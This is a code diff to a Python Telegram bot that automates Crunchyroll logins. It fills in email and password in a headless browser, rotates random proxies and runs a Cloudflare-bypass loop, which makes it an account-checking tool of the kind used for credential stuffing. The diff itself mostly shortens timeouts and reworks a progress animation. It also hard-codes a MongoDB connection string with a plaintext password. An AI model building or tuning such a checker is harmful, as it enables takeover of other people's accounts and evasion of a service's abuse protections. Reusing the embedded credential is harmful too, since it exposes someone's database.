@@ -21,7 +21,6 @@ GLOBAL_DELAY = 5
 SUCCESS_IMAGE = "https://files.catbox.moe/ljc4hb.png"
 START_IMAGE = "https://files.catbox.moe/vngb2d.png"
 
-# MongoDB connection string (from env or default)
 MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://yorichiiprimebusiness_db_user:DuLN8McOnlyGQyuc@grpmanegmentbot1rem.5sef7fp.mongodb.net/?appName=GRPMANEGMENTBOT1REM")
 DB_NAME = os.getenv("DB_NAME", "crunchyroll_bot")
 
@@ -42,6 +41,7 @@ class HealthHandler(BaseHTTPRequestHandler):
 def start_health_server():
     port = int(os.getenv("PORT", 8080))
     server = HTTPServer(('0.0.0.0', port), HealthHandler)
+    server.allow_reuse_address = True
     thread = threading.Thread(target=server.serve_forever, daemon=True)
     thread.start()
     logger.info(f"Health server running on port {port}")
@@ -52,7 +52,6 @@ db = client[DB_NAME]
 users_collection = db["users"]
 usage_collection = db["usage"]
 
-# Create indexes
 async def init_db():
     await users_collection.create_index("user_id", unique=True)
     await usage_collection.create_index([("user_id", 1), ("date", 1)], unique=True)
@@ -69,7 +68,7 @@ def load_proxies():
 PROXY_LIST = load_proxies()
 logger.info(f"Loaded {len(PROXY_LIST)} proxies.")
 
-# ============ CLOUDFLARE BYPASS ============
+# ============ CLOUDFLARE BYPASS (moved up for clarity) ============
 async def bypass_cloudflare(page, max_wait=120):
     start = asyncio.get_event_loop().time()
     while (asyncio.get_event_loop().time() - start) < max_wait:
@@ -100,7 +99,7 @@ async def bypass_cloudflare(page, max_wait=120):
         except:
             await asyncio.sleep(1)
     return False
-    
+
 # ============ USER FUNCTIONS ============
 async def add_user(user_id):
     await users_collection.update_one(
@@ -122,12 +121,11 @@ async def get_user_usage(user_id):
 
 async def increment_usage(user_id):
     today = datetime.now(timezone.utc).date().isoformat()
-    result = await usage_collection.update_one(
+    await usage_collection.update_one(
         {"user_id": user_id, "date": today},
         {"$inc": {"count": 1}},
         upsert=True
     )
-    # Get updated count
     doc = await usage_collection.find_one({"user_id": user_id, "date": today})
     return doc["count"] if doc else 0
 
@@ -145,7 +143,6 @@ async def is_subscribed(context, user_id):
                 return False
         except Exception as e:
             logger.warning(f"Could not check membership for @{channel}: {e}")
-            # If bot can't check (private), we skip
             continue
     return True
 
@@ -203,11 +200,9 @@ async def send_main_menu(update, context, edit=False):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     await add_user(user_id)
-
     if not await is_subscribed(context, user_id):
         await subscription_required(update, context)
         return
-
     await send_main_menu(update, context)
 
 async def verify_sub(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -445,7 +440,7 @@ async def add_to_queue(bot, user_id, chat_id, email, password, msg_id=None):
         worker_running = True
         asyncio.create_task(worker())
 
-# ============ LOGIN FUNCTION ============
+# ============ OPTIMIZED LOGIN FUNCTION ============
 async def login_crunchyroll(email: str, password: str) -> dict:
     result = {"success": False, "screenshot": None, "message": ""}
     proxy_str = random.choice(PROXY_LIST) if PROXY_LIST else None
@@ -467,10 +462,11 @@ async def login_crunchyroll(email: str, password: str) -> dict:
 
         try:
             sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
-            await page.goto(sso_url, timeout=30000)  # reduced from 60000
-            await page.wait_for_load_state("domcontentloaded", timeout=15000)  # faster than networkidle
+            # Reduced timeout and faster load state
+            await page.goto(sso_url, timeout=30000)
+            await page.wait_for_load_state("domcontentloaded", timeout=15000)
 
-            # Cloudflare bypass (unchanged)
+            # Cloudflare bypass
             if not await bypass_cloudflare(page):
                 result["message"] = "⏱️ Cloudflare timed out."
                 result["screenshot"] = await page.screenshot()
@@ -486,24 +482,24 @@ async def login_crunchyroll(email: str, password: str) -> dict:
                 except:
                     pass
 
-            # Email (timeout reduced)
+            # Email – reduced timeouts and sleeps
             email_field = await page.wait_for_selector("input[name='email'], input[type='email']", timeout=5000)
             await email_field.fill(email)
-            await asyncio.sleep(0.5)  # reduced from 1
+            await asyncio.sleep(0.3)
 
             # Password
             password_field = await page.wait_for_selector("input[type='password']", timeout=5000)
             await password_field.fill(password)
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.2)
 
             # Submit
             submit_btn = await page.wait_for_selector("button[type='submit'], button:has-text('LOGIN')", timeout=5000)
             await submit_btn.click()
 
-            # Wait for response – reduced sleep
-            await asyncio.sleep(3)  # was 5
+            # Reduced wait after submit
+            await asyncio.sleep(3)
 
-            # Check for verification – loop still runs but breaks early if cleared
+            # Wait for verification to clear (up to 30s, but usually faster)
             for _ in range(15):
                 content = await page.content()
                 if "verifying" not in content.lower():
@@ -533,8 +529,7 @@ async def login_crunchyroll(email: str, password: str) -> dict:
             await browser.close()
     return result
 
-# ============ WORKER ============
-# ============ WORKER ============
+# ============ WORKER WITH PARALLEL LOGIN AND FAST ANIMATION ============
 async def worker():
     global worker_running
     while True:
@@ -547,27 +542,12 @@ async def worker():
             password = task["password"]
             msg_id = task.get("msg_id")
 
-            # ---- Start the login in the background ----
+            # ---- Start login immediately in the background ----
             login_task = asyncio.create_task(login_crunchyroll(email, password))
 
-            # ---- Show initial status ----
-            status_msg = "Grab a cup of tea... this will take a moment!\n0%"
-            if msg_id:
-                try:
-                    await bot.edit_message_text(
-                        chat_id=chat_id,
-                        message_id=msg_id,
-                        text=status_msg
-                    )
-                except Exception:
-                    msg = await bot.send_message(chat_id=chat_id, text=status_msg)
-                    msg_id = msg.message_id
-            else:
-                msg = await bot.send_message(chat_id=chat_id, text=status_msg)
-                msg_id = msg.message_id
-
-            # ---- Progress bar steps (10% to 90%) ----
-            progress_steps = [
+            # ---- Progress bar steps with shorter delays ----
+            steps = [
+                ("Grab a cup of tea... this will take a moment!\n0%", 1.5),
                 ("▰▱▱▱▱▱▱▱▱▱ 10%\n(⁠◕‿◕⁠)", 1.5),
                 ("▰▰▱▱▱▱▱▱▱▱ 20%\n>⁠.⁠<", 1.5),
                 ("▰▰▰▱▱▱▱▱▱▱ 30%\n༼⁠ ⁠つ⁠ ⁠◕‿◕⁠ ⁠༽⁠つ", 1.5),
@@ -579,9 +559,23 @@ async def worker():
                 ("▰▰▰▰▰▰▰▰▰▱ 90%\n(⁠＾3＾⁠♪", 1.5),
             ]
 
-            # ---- Loop through progress steps while login runs ----
-            for text, delay in progress_steps:
-                # Check if login is already done
+            # Send initial status
+            if msg_id:
+                try:
+                    await bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=msg_id,
+                        text=steps[0][0]
+                    )
+                except Exception:
+                    msg = await bot.send_message(chat_id=chat_id, text=steps[0][0])
+                    msg_id = msg.message_id
+            else:
+                msg = await bot.send_message(chat_id=chat_id, text=steps[0][0])
+                msg_id = msg.message_id
+
+            # Loop through progress steps while login runs
+            for text, delay in steps[1:]:
                 if login_task.done():
                     break
                 await asyncio.sleep(delay)
@@ -594,9 +588,8 @@ async def worker():
                 except Exception:
                     pass
 
-            # ---- Wait for login to complete (if not already) ----
+            # If login is still running, show 100% and wait
             if not login_task.done():
-                # Show "Almost done..." while waiting
                 try:
                     await bot.edit_message_text(
                         chat_id=chat_id,
@@ -605,19 +598,19 @@ async def worker():
                     )
                 except Exception:
                     pass
-                await login_task  # wait for it to finish
+                await login_task
 
-            # ---- Get the result ----
+            # Get result
             result = login_task.result()
             new_count = await increment_usage(user_id)
 
-            # ---- Delete the status message ----
+            # Delete status message
             try:
                 await bot.delete_message(chat_id=chat_id, message_id=msg_id)
             except Exception:
                 pass
 
-            # ---- Send final result ----
+            # ---- Send ASCII boxed result ----
             if result["success"]:
                 box = (
                     "╭──── success ────╮\n"
@@ -655,28 +648,22 @@ async def worker():
             logger.error(f"Worker error: {e}")
         finally:
             task_queue.task_done()
-# ---------- MAIN ----------
+
+# ============ MAIN ============
 def main():
-    """Start the bot with a persistent event loop and health server."""
     if not BOT_TOKEN:
         print("❌ BOT_TOKEN not set. Exiting.")
         return
 
-    # Start health server (keeps Render free tier alive)
     start_health_server()
 
-    # Create and set a new event loop
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-
-    # Run the async DB initialization inside this loop
     loop.run_until_complete(init_db())
     logger.info("MongoDB initialized.")
 
-    # Build the application
     app = Application.builder().token(BOT_TOKEN).build()
 
-    # Add all handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("chk", cmd_chk))
     app.add_handler(CommandHandler("usage", cmd_usage))
@@ -687,7 +674,6 @@ def main():
     app.add_handler(CallbackQueryHandler(main_menu_button, pattern="^(check|profile|help|support|back_main)$"))
 
     print("🤖 Bot started. Waiting for commands...")
-    # Run polling – this will use the loop we set
     app.run_polling()
 
 if __name__ == "__main__":
